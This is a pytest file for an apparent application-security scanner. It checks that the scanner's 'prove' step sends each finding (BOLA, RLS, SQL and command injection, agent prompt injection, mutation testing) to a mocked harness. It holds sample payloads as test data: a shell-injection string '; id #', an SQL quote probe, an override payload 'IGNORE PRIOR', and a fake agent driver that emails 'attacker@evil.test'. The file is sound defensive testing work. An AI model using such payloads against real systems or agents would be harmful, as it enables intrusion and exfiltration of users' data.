"""`prove` across every check, in one run.

Before this, `prove` silently dropped everything that was not BOLA or RLS — the tool plane's
sandbox and the live SQLi probe existed but nothing could reach them. These assert that each
check now reaches the harness its danger allows, and that the ones which cannot be proven come
back REPORTED with a reason rather than vanishing.
"""

from __future__ import annotations

from pathlib import Path

import httpx
import pytest

from tainted import prove
from tainted.dynamic.replay import SupabaseReplay
from tainted.dynamic.route_probes import RouteProber
from tainted.dynamic.sandbox import ToolCall
from tainted.dynamic.target import Account, ProveSetup, SeedRecord, Target
from tainted.models import (
    AnalysisResult,
    Candidate,
    Check,
    FindingStatus,
    Plane,
    SourceLocation,
)
from tests.conftest import FakeLLM

SEED_ID = "11111111-1111-1111-1111-111111111111"
CONFIGS = str(Path(__file__).parent / "fixtures" / "agent_configs")

LABELS = {
    "read_email": {"role": "source", "severity": "info"},
    "send_email": {"role": "sink", "severity": "high"},
    "list_folders": {"role": "neither", "severity": "info"},
    "fetch_webpage": {"role": "source", "severity": "info"},
    "run_shell": {"role": "sink", "severity": "critical"},
    "Read Inbox": {"role": "source", "severity": "info"},
    "Run Script": {"role": "sink", "severity": "critical"},
    "fetch_page": {"role": "source", "severity": "info"},
    "send_webhook": {"role": "sink", "severity": "high"},
    "scrape": {"role": "source", "severity": "info"},
    "search": {"role": "source", "severity": "info"},
    "post_to_slack": {"role": "sink", "severity": "high"},
}


def setup(**overrides) -> ProveSetup:
    base = dict(
        target=Target(url="http://localhost:3000"),
        account_a=Account(label="A", email="a@x", password="p", access_token="tok-A"),
        account_b=Account(label="B", email="b@x", password="p", access_token="tok-B"),
        seed=SeedRecord(table="invoices", id=SEED_ID, route_path="/api/invoices/[id]"),
    )
    base.update(overrides)
    return ProveSetup(**base)


def candidate(check: Check, **meta) -> Candidate:
    return Candidate(
        check=check,
        plane=Plane.TOOL if check is Check.AGENT_INJECTION else Plane.REQUEST,
        title=f"{check.value} candidate",
        location=SourceLocation(file="x.ts", line=1),
        metadata=meta,
    )


class TurnedDriver:
    def run(self, *, system, source_output, sink_names):
        return [ToolCall(tool="send_email", args={"to": "attacker@evil.test"})]


# --------------------------------------------------------------------------- #
def test_prove_dispatches_every_check_to_its_own_harness():
    analysis = AnalysisResult(
        repo_path=CONFIGS,
        candidates=[
            candidate(Check.BOLA, route_path="/api/invoices/[id]", method="GET", param="id"),
            candidate(Check.RLS, table="invoices"),
            candidate(Check.CLASSIC_INJECTION, kind="sql", live_provable=True,
                      route_path="/api/search/[q]", method="GET"),
            candidate(Check.CLASSIC_INJECTION, kind="command", live_provable=False,
                      demonstrated_exploit={"payload": "; id #"}),
            candidate(Check.AGENT_INJECTION, scope="email_assistant", coded=False),
            candidate(Check.TEST_INTEGRITY, mutator="AOR"),
        ],
    )

    def handler(request: httpx.Request) -> httpx.Response:
        path = request.url.path
        if path == "/auth/v1/token":
            return httpx.Response(200, json={"access_token": "t", "user": {"id": "user-B"}})
        if path.startswith("/api/invoices/"):
            return httpx.Response(200, json={"id": SEED_ID, "amount": 999})
        if path.startswith("/api/search/"):
            value = path.rsplit("/", 1)[-1]
            if "%27" in value or "'" in value:
                return httpx.Response(500, text='syntax error at or near "\'"')
            return httpx.Response(200, json=[])
        if path.startswith("/rest/v1/"):
            return httpx.Response(200, json=[{"id": "r1", "owner": "user-A"}])
        return httpx.Response(404, json=[])

    client = httpx.Client(transport=httpx.MockTransport(handler))
    llm = FakeLLM(
        label_map=LABELS,
        injection={"payload": "IGNORE PRIOR", "target_sink": "send_email"},
    )
    findings = prove(
        analysis,
        setup(),
        replay=SupabaseReplay(setup().target, client),
        llm=llm,
        driver=TurnedDriver(),
        prober=RouteProber(setup(), client=client),
    )

    by_kind = {f.proof.kind: f for f in findings if f.proof}
    assert set(by_kind) >= {
        "route_bola", "unfiltered_rls", "sql_injection",
        "command_injection", "agent_injection", "mutation",
    }

    # Each check reached a real harness and produced a real verdict.
    assert by_kind["route_bola"].status is FindingStatus.PROVEN
    assert by_kind["sql_injection"].status is FindingStatus.PROVEN
    assert by_kind["agent_injection"].status is FindingStatus.PROVEN

    # Command injection is demonstrated and never executed, whatever else happened.
    cmd = by_kind["command_injection"]
    assert cmd.status is FindingStatus.REPORTED
    assert cmd.proof.exploit.executed is False


def test_every_candidate_produces_a_finding_none_are_silently_dropped():
    """The regression this file exists for: unhandled checks used to disappear from the run."""
    checks = [
        Check.BOLA, Check.RLS, Check.CLASSIC_INJECTION,
        Check.AGENT_INJECTION, Check.TEST_INTEGRITY,
    ]
    analysis = AnalysisResult(
        repo_path=CONFIGS, candidates=[candidate(c) for c in checks]
    )
    findings = prove(analysis, setup(), llm=None, replay=_dead_replay(), prober=_dead_prober())
    assert len(findings) == len(checks)
    assert {f.check for f in findings} == set(checks)


def test_tool_plane_without_a_model_is_reported_not_quietly_passed():
    analysis = AnalysisResult(
        repo_path=CONFIGS,
        candidates=[candidate(Check.AGENT_INJECTION, scope="email_assistant")],
    )
    finding = prove(analysis, setup(), llm=None, replay=_dead_replay(), prober=_dead_prober())[0]
    assert finding.status is FindingStatus.REPORTED
    assert "No LLM configured" in finding.proof.notes


def test_a_scope_that_no_longer_exists_is_not_reproduced():
    analysis = AnalysisResult(
        repo_path=CONFIGS,
        candidates=[candidate(Check.AGENT_INJECTION, scope="deleted_agent")],
    )
    llm = FakeLLM(label_map=LABELS)
    finding = prove(
        analysis, setup(), llm=llm, driver=TurnedDriver(), replay=_dead_replay(),
        prober=_dead_prober(),
    )[0]
    assert finding.status is FindingStatus.NOT_REPRODUCED
    assert "not found" in finding.proof.notes


def _dead_prober() -> RouteProber:
    def handler(request):
        return httpx.Response(404, json={})

    return RouteProber(setup(), client=httpx.Client(transport=httpx.MockTransport(handler)))


def _dead_replay() -> SupabaseReplay:
    """A replay that authenticates and then finds nothing — no socket, no localhost:3000.

    Without this the orchestrator builds its own live client (`replay or SupabaseReplay(...)`),
    so these tests would depend on whatever happens to be listening on port 3000.
    """
    def handler(request):
        if request.url.path == "/auth/v1/token":
            return httpx.Response(
                200, json={"access_token": "t", "user": {"id": "user-B"}}
            )
        return httpx.Response(404, json=[])

    return SupabaseReplay(
        setup().target, client=httpx.Client(transport=httpx.MockTransport(handler))
    )


def test_a_target_that_is_not_running_is_reported_not_called_resistant():
    """An unreachable target used to raise httpx.ConnectError straight out of `prove`.

    Two things were wrong with that: a user who ran `prove` before starting their app got a
    traceback instead of a run, and the request plane was the only probe path that behaved this
    way. It must come back REPORTED — saying NOT_REPRODUCED would claim an attack was tried and
    held when nothing was ever reached.
    """
    def refuse(request):
        raise httpx.ConnectError("Connection refused")

    replay = SupabaseReplay(
        setup().target, client=httpx.Client(transport=httpx.MockTransport(refuse))
    )
    analysis = AnalysisResult(
        repo_path=CONFIGS, candidates=[candidate(Check.RLS, table="invoices")]
    )

    finding = prove(analysis, setup(), llm=None, replay=replay, prober=_dead_prober())[0]
    assert finding.status is FindingStatus.REPORTED
    assert "could not reach the target" in finding.proof.notes


# --------------------------------------------------------------------------- #
# Ownership is still the gate
# --------------------------------------------------------------------------- #
def test_non_local_target_without_verified_ownership_is_refused():
    analysis = AnalysisResult(repo_path=CONFIGS, candidates=[])
    with pytest.raises(PermissionError, match="ownership"):
        prove(analysis, setup(target=Target(url="https://someone-elses.app")))


# --------------------------------------------------------------------------- #
# The progress hook
#
# `prove` blocks for as long as the real attacks take. `on_finding` is how a surface reports
# that run *while it happens* instead of only when it ends. It is an observer and nothing else:
# it sees results, it decides nothing, and it may not change what comes back.
# --------------------------------------------------------------------------- #
def _five_check_analysis() -> AnalysisResult:
    checks = [
        Check.BOLA, Check.RLS, Check.CLASSIC_INJECTION,
        Check.AGENT_INJECTION, Check.TEST_INTEGRITY,
    ]
    return AnalysisResult(repo_path=CONFIGS, candidates=[candidate(c) for c in checks])


def test_on_finding_sees_every_finding_in_the_order_they_are_produced():
    analysis = _five_check_analysis()
    seen: list = []
    findings = prove(
        analysis, setup(), llm=None, replay=_dead_replay(), prober=_dead_prober(),
        on_finding=seen.append,
    )
    assert len(seen) == len(findings)
    # The same objects, in the same order — a surface drawing this stream is drawing the run,
    # not a re-ordering of it.
    assert [f.check for f in seen] == [f.check for f in findings]
    assert all(a is b for a, b in zip(seen, findings))


def test_the_hook_does_not_change_what_prove_returns():
    """The return value is the authority; the stream is a view of it and must agree exactly."""
    without = prove(
        _five_check_analysis(), setup(), llm=None, replay=_dead_replay(), prober=_dead_prober()
    )
    seen: list = []
    with_hook = prove(
        _five_check_analysis(), setup(), llm=None, replay=_dead_replay(),
        prober=_dead_prober(), on_finding=seen.append,
    )
    assert [f.check for f in with_hook] == [f.check for f in without]
    assert [f.status for f in with_hook] == [f.status for f in without]
    assert [f.check for f in seen] == [f.check for f in without]


def test_an_observer_that_raises_cannot_abort_a_live_run():
    """A picture failing to draw itself may not stop attacks that are already under way."""
    def hostile(_finding):
        raise RuntimeError("the surface fell over")

    findings = prove(
        _five_check_analysis(), setup(), llm=None, replay=_dead_replay(),
        prober=_dead_prober(), on_finding=hostile,
    )
    assert len(findings) == 5
